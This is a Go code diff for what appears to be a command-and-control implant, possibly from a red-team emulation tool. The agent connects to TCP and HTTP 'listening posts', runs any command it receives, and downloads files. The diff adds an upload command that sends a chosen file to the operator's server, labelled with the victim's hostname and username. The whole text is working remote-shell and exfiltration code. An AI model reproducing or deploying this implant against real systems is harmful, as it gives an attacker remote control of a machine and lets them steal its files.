@@ -13,7 +13,7 @@ import (
    "./commands"
 )
 
-var httpServer string
+var paw, httpServer string
 
 func runNextCommand(message string) []byte {
    if strings.HasPrefix(message, "cd") {
@@ -24,6 +24,10 @@ func runNextCommand(message string) []byte {
       pieces := strings.Split(message, "download")
       go commands.Download(httpServer, pieces[1])
       return []byte("Download initiated\n")
+   } else if (strings.HasPrefix(message, "upload")) {
+      pieces := strings.Split(message, "upload")
+      go commands.Upload(httpServer, pieces[1], paw)
+      return []byte("Upload initiated\n")
    } else {
       bites := commands.Execute(message)
       return bites
@@ -42,7 +46,7 @@ func listen(conn net.Conn) {
 func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
-   paw := fmt.Sprintf("%s$%s", host, user.Username)
+   paw = fmt.Sprintf("%s$%s", host, user.Username)
 
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
